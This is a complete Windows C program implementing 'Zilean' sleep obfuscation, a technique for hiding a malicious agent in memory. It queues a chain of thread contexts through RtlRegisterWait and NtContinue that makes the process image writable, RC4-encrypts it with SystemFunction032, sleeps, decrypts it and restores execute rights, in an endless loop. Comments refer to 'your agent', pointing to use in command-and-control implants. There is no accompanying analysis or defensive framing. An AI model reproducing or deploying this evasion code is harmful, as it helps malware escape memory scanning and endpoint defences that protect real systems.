#include <windows.h>
#include <stdio.h>
#include <ntstatus.h>
#include <winternl.h>

#define U_PTR( x ) ( UINT_PTR ) x

typedef enum _EVENT_TYPE
{
    NotificationEvent,
    SynchronizationEvent
} EVENT_TYPE;

// Function Definiation 
typedef struct _Win32 
{

    PVOID SystemFunction32;
    PVOID NtContinue;

    NTSTATUS(NTAPI *RtlRegisterWait)(PHANDLE WaitHandle, HANDLE Handle, WAITORTIMERCALLBACKFUNC Function, PVOID Context, ULONG Milliseconds, ULONG Flags);

    NTSTATUS(NTAPI* NtCreateEvent)(PHANDLE EventHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, EVENT_TYPE EventType, BOOLEAN InitialState);

    NTSTATUS(NTAPI* NtWaitForSingleObject)(HANDLE Handle, BOOLEAN Alertable, PLARGE_INTEGER Timeout);

    NTSTATUS(NTAPI *NtSignalAndWaitForSingleObject)(HANDLE SignalHandle, HANDLE WaitHandle, BOOLEAN Alertable, PLARGE_INTEGER Timeout);

} Win32, *PWin32;

Win32 win32 = { 0 };

DWORD SleepTime = 5000;

ULONG Random()
{
    return (ULONG)rand();
}

VOID ZilieanObf(DWORD sleeptime) {

    NTSTATUS Status    = STATUS_SUCCESS;
    STRING   Key       = { 0 };
    STRING   Img       = { 0 };
    BYTE     Rnd[16]   = { 0 };
    CONTEXT  Ctx[7]    = { 0 };
    CONTEXT  CtxInit   = { 0 };
    HANDLE   EvntTimer = { 0 };
    HANDLE   EvntStart = { 0 };
    HANDLE   EvntWait  = { 0 };
    HANDLE   EvntEnd   = { 0 };
    HANDLE   Timer     = { 0 };
    DWORD    Delay     = { 0 };
    DWORD    Value     = { 0 };

    /* image base and size */
    PVOID ImageBase = GetModuleHandleA(NULL);
    ULONG ImageSize = ((PIMAGE_NT_HEADERS)(U_PTR(ImageBase) + ((PIMAGE_DOS_HEADER)ImageBase)->e_lfanew))->OptionalHeader.SizeOfImage;

    printf("[*] Starting Zilean Sleep Obfuscation\n");
    printf("[*] Image @ %p [%ld bytes]\n", ImageBase, ImageSize);

    /* generate a new key */
    for (int i = 0; i < 16; i++) { 
        Rnd[i] = (BYTE)Random();
    }

    /* set key buffer and size */
    Key.Buffer = Rnd;
    Key.Length = sizeof(Rnd);

    /* set image pointer and size */
    Img.Buffer = ImageBase; /* address of your agent */
    Img.Length = ImageSize; /* size of agent memory */

    /* create events for starting the rop chain and waiting for the rop chain to finish */
    if (!NT_SUCCESS(Status = win32.NtCreateEvent(&EvntTimer, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE)) ||
        !NT_SUCCESS(Status = win32.NtCreateEvent(&EvntWait,  EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE)) ||
        !NT_SUCCESS(Status = win32.NtCreateEvent(&EvntStart, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE)) ||
        !NT_SUCCESS(Status = win32.NtCreateEvent(&EvntEnd,   EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE)))
    {
        printf("[!] NtCreateEvent Failed with Error: %lx\n", Status);
        goto LEAVE;
    }

    // This is the only Difference is Using is different API's
    /* let's start the rop part of this operation/sleep obf */
    if (NT_SUCCESS(Status = win32.RtlRegisterWait(&Timer, EvntWait, RtlCaptureContext, &CtxInit, Delay += 100, WT_EXECUTEONLYONCE | WT_EXECUTEINWAITTHREAD)))
    {
        /* wait til we successfully finished calling RtlCaptureContext */
        if (NT_SUCCESS(Status = win32.RtlRegisterWait(&Timer, EvntWait, SetEvent, EvntTimer, Delay += 100, WT_EXECUTEONLYONCE | WT_EXECUTEINWAITTHREAD)))
        {
            /* wait til we successfully retrieved the timers thread context */
            if (!NT_SUCCESS(Status = win32.NtWaitForSingleObject(EvntTimer, FALSE, FALSE))) { 
                goto LEAVE;
            }

            /* at this point we can start preparing the ROPs and execute the timers */
            for (int i = 0; i < 7; i++) {
                memcpy(&Ctx[i], &CtxInit, sizeof(CONTEXT));
                Ctx[i].Rsp -= sizeof(PVOID);
            }

            /* Start of Ropchain */
            Ctx[0].Rip = U_PTR(WaitForSingleObjectEx);
            Ctx[0].Rcx = U_PTR(EvntStart);
            Ctx[0].Rdx = U_PTR(INFINITE);
            Ctx[0].R8  = U_PTR(NULL);

            /* Protect */
            Ctx[1].Rip = U_PTR(VirtualProtect);
            Ctx[1].Rcx = U_PTR(ImageBase);
            Ctx[1].Rdx = U_PTR(ImageSize);
            Ctx[1].R8  = U_PTR(PAGE_READWRITE);
            Ctx[1].R9  = U_PTR(&Value);

            /* Encrypt image base address */
            Ctx[2].Rip = U_PTR(win32.SystemFunction32);
            Ctx[2].Rcx = U_PTR(&Img);
            Ctx[2].Rdx = U_PTR(&Key);

            /* Sleep    */
            Ctx[3].Rip = U_PTR(WaitForSingleObjectEx);
            Ctx[3].Rcx = U_PTR(GetCurrentProcess());
            Ctx[3].Rdx = U_PTR(sleeptime);
            Ctx[3].R8  = U_PTR(FALSE);

            /* Sys032   */
            Ctx[4].Rip = U_PTR(win32.SystemFunction32);
            Ctx[4].Rcx = U_PTR(&Img);
            Ctx[4].Rdx = U_PTR(&Key);

            /* Protect  */
            Ctx[5].Rip = U_PTR(VirtualProtect);
            Ctx[5].Rcx = U_PTR(ImageBase);
            Ctx[5].Rdx = U_PTR(ImageSize);
            Ctx[5].R8  = U_PTR(PAGE_EXECUTE_READ);
            Ctx[5].R9  = U_PTR(&Value);

            /* End of Ropchain */
            Ctx[6].Rip = U_PTR(SetEvent);
            Ctx[6].Rcx = U_PTR(EvntEnd);

            printf("[*] Queue sleep obfuscation chain\n");

            /* execute timers */
            for (int i = 0; i < 7; i++) {
                if (!NT_SUCCESS(Status = win32.RtlRegisterWait(&Timer, EvntWait, win32.NtContinue, &Ctx[i], Delay += 100, WT_EXECUTEONLYONCE | WT_EXECUTEINWAITTHREAD))) {
                    printf("[!] RtlRegisterWait Failed with Error: %lx\n", Status);
                    goto LEAVE;
                }
            }

            printf("[*] Trigger sleep obfuscation chain\n");

            /* trigger/start the rop chain and wait for it to end */
            if (!NT_SUCCESS(Status = win32.NtSignalAndWaitForSingleObject(EvntStart, EvntEnd, FALSE, NULL))) {
                printf("[!] NtSignalAndWaitForSingleObject Failed with Error: %lx\n", Status);
                goto LEAVE;
            }
        } else {
            printf("[!] RtlRegisterWait Failed with Error: %lx\n", Status);
        }
    } else {
        printf("[!] RtlRegisterWait Failed with Error: %lx\n", Status);
    }

    printf("[*] Ending the obfuscation chain\n\n");

LEAVE:
    if (EvntTimer) {
        CloseHandle(EvntTimer);
        EvntTimer = NULL;
    }

    if (EvntWait) {
        CloseHandle(EvntWait);
        EvntWait = NULL;
    }

    if (EvntStart) {
        CloseHandle(EvntStart);
        EvntStart = NULL;
    }

    if (EvntEnd) {
        CloseHandle(EvntEnd);
        EvntEnd = NULL;
    }
}

int main()
{
    HMODULE hNtdll = { 0 };
    HMODULE hAdvapi32 = { 0 };


    hNtdll = GetModuleHandleA("ntdll.dll");
    hAdvapi32 = LoadLibraryA("advapi32.dll");

    if ( !hNtdll || !hAdvapi32 )
    {
        printf("[-] Failed to load the Dlls \n");
        return -1;
    }

    printf("[+] The Handle of Ntdll is 0x%p \n", hNtdll);
    printf("[+] The Handle of Advapi32 is 0x%p \n", hAdvapi32);

    win32.NtContinue = (PVOID)GetProcAddress(hNtdll, "NtContinue");
    win32.RtlRegisterWait = (PVOID)GetProcAddress(hNtdll, "RtlRegisterWait");
    win32.NtCreateEvent = (PVOID)GetProcAddress(hNtdll, "NtCreateEvent");
    win32.NtWaitForSingleObject = (PVOID)GetProcAddress(hNtdll, "NtWaitForSingleObject");
    win32.NtSignalAndWaitForSingleObject = (PVOID)GetProcAddress(hNtdll, "NtSignalAndWaitForSingleObject");
    win32.SystemFunction32 = (PVOID)GetProcAddress(hAdvapi32, "SystemFunction032");

    if ( !win32.NtContinue || !win32.RtlRegisterWait || !win32.NtCreateEvent || !win32.NtWaitForSingleObject || !win32.NtSignalAndWaitForSingleObject || !win32.SystemFunction32 )
    {
        printf("[-] Failed to get function address \n");
        return -1;
    }

    srand((unsigned)GetTickCount());

    while (1)
    {
        ZilieanObf(SleepTime);
    }


    return 0;
}